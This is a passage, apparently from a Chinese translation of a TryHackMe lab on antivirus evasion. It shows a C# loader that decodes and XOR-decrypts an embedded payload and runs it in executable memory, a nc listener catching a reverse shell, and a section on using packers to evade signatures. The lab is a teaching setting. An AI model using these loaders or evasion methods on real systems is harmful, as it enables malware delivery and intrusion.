class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> dataBS64 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Convert</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">FromBase64String</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dataBS64</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;THMK3y123!&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">//Convert Key into bytes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> keyBytes </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Encoding</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ASCII</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">GetBytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> encoded </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> keyBytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> codeAddr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UInt32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">encoded</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READWRITE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Marshal</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">encoded</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IntPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">codeAddr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> encoded</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> threadId </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> parameter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> codeAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> parameter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> threadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div></div></div></details>
<p>请注意，我们仅仅结合了几个在单独使用时被检测到的非常简单技术。 尽管如此，这次防病毒软件不会对有效载荷发出警告，因为这两种方法的组合不是它可以直接分析的东西。</p>
<p>让我们在Windows机器上使用以下命令编译我们的有效载荷：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Compile Our Encrypted Payload</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> csc.exe EncStageless.cs</span><br></span></code></pre></div></div>
<p>在运行我们的有效载荷之前，让我们设置一个<code>nc</code>监听器。 将我们的有效载荷复制并执行到受害机器后，我们应该按预期获得一个连接：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Set Up nc Listener</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lvp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">443</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Listening on </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">family </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">, port </span><span class="token number" style="color:#36acaa">443</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection from ip-10-10-139-83.eu-west-1.compute.internal </span><span class="token number" style="color:#36acaa">49817</span><span class="token plain"> received</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Microsoft Windows </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">Version </span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain">.17763.1821</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2018</span><span class="token plain"> Microsoft Corporation. All rights reserved.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System3</span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<p>如您所见，有时简单的调整就足够了。 大多数情况下，您在线上找到的任何特定方法可能无法开箱即用，因为可能已经存在针对它们的检测签名。 然而，使用一点想象力来定制任何方法可能足以成功绕过。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>回答以下问题</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 尝试在THM防病毒检查的<code>http://MACHINE_IP/</code>上使用此技术（结合编码和加密）。 它是否绕过了已安装的防病毒软件？ </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="任务9-打包器">任务9 打包器<a href="#任务9-打包器" class="hash-link" aria-label="任务9 打包器的直接链接" title="任务9 打包器的直接链接" translate="no">​</a></h2>
<p>另一种击败基于磁盘的防病毒检测的方法是使用打包器。 <strong>打包器</strong>是一种软件，它接受一个程序作为输入并对其进行转换，使其结构看起来不同，但其功能完全保持不变。 打包器这样做有两个主要目标：</p>
<ul>
<li class="">压缩程序以占用更少空间。</li>
<li class="">总体上保护程序免受逆向工程。</li>
</ul>
<p>打包器通常被希望保护其软件免受逆向工程或破解的软件开发人员使用。 它们通过实现一系列转换来实现一定程度的保护，这些转换包括压缩、加密、添加调试保护等。 正如您可能已经猜到的，打包器也通常用于不费太多力气地混淆恶意软件。</p>
<p>市面上有相当多的打包器，包括UPX、MPRESS、Themida等。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="打包应用程序">打包应用程序<a href="#打包应用程序" class="hash-link" aria-label="打包应用程序的直接链接" title="打包应用程序的直接链接" translate="no">​</a></h3>
<p>虽然每个打包器的操作方式不同，但让我们看一个简单打包器会做什么的基本示例。</p>
<p>当应用程序被打包时，它将使用<strong>打包</strong>函数以某种方式进行转换。 打包函数需要能够以可以被<strong>解包</strong>函数合理反转的方式混淆和转换应用程序的原始代码，以便保留应用程序的原始功能。 虽然有时打包器可能会添加一些代码（例如，使调试应用程序更加困难），但它通常希望能够执行时恢复您编写的原始代码。</p>
<p><img decoding="async" loading="lazy" alt="packers" src="/TryHackMe-CN/assets/images/image_20251107-190725-e4d1a7bcaa70cebf227a47a676245d15.png" width="1386" height="535" class="img_ev3q"></p>
<p>应用程序的打包版本将包含您打包的应用程序代码。 由于这个新的打包代码被混淆了，应用程序需要能够从中解包原始代码。 为此，打包器将嵌入一个包含解包器的代码存根，并将可执行文件的主入口点重定向到它。</p>
<p>当您打包的应用程序被执行时，将发生以下情况：</p>
<p><img decoding="async" loading="lazy" alt="packers" src="/TryHackMe-CN/assets/images/image_20251107-190744-362c25ed4c631a26cdc548cd5e245ef7.png" width="1108" height="777" class="img_ev3q"></p>
<ol>
<li class="">解包器首先被执行，因为它是可执行文件的入口点。</li>
<li class="">解包器读取打包应用程序的代码。</li>
<li class="">解包器将在内存中的某个位置写入原始解包代码，并将应用程序的执行流定向到它。</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="打包器和防病毒软件">打包器和防病毒软件<a href="#打包器和防病毒软件" class="hash-link" aria-label="打包器和防病毒软件的直接链接" title="打包器和防病毒软件的直接链接" translate="no">​</a></h3>
<p>到目前为止，我们可以看到打包器如何帮助绕过防病毒解决方案。 假设您构建了一个反向shell可执行文件，但防病毒软件将其捕获为恶意软件，因为它匹配已知签名。 在这种情况下，使用打包器将转换反向shell可执行文件，使其在磁盘上不匹配任何已知签名。 因此，您应该能够将您的有效载荷分发到任何机器的磁盘上而不会有太多问题。</p>
<p>然而，防病毒解决方案仍可能因以下几个原因捕获您打包的应用程序：</p>
<ul>
<li class="">虽然您的原始代码可能被转换为无法识别的东西，但请记住打包的可执行文件包含一个带有解包器代码的存根。 如果解包器有已知签名，防病毒解决方案可能仅基于解包器存根就标记任何打包的可执行文件。</li>
<li class="">在某个时刻，您的应用程序将把原始代码解包到内存中，以便可以执行。 如果您试图绕过的防病毒解决方案可以进行内存扫描，您的代码在解包后可能仍然被检测到。</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="打包我们的shellcode">打包我们的shellcode<a href="#打包我们的shellcode" class="hash-link" aria-label="打包我们的shellcode的直接链接" title="打包我们的shellcode的直接链接" translate="no">​</a></h3>
<p>让我们从一个基本的C# shellcode开始。 您也可以在Windows机器的<code>C:\Tools\CS Files\UnEncStagelessPayload.cs</code>中找到此代码：</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 完整有效载荷代码（点击阅读） </summary><div><div class="collapsibleContent_i85q"><div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Net</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Configuration</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Install</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Runtime</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">InteropServices</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Security</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Cryptography</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">X509Certificates</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Program</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flAllocationType</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">IntPtr</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadAttributes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwStackSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">IntPtr</span><span class="token plain"> param</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwCreationFlags</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">IntPtr</span><span class="token plain"> hHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwMilliseconds</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> MEM_COMMIT </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1000</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> PAGE_EXECUTE_READWRITE </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token constructor-invocation class-name keyword" style="color:#00009f">byte</span><span class="token constructor-invocation class-name punctuation" style="color:#393A34">[</span><span class="token constructor-invocation class-name punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">0xfc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token range operator" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xda</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xd5</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> codeAddr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UInt32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READWRITE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Marshal</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IntPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">codeAddr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" 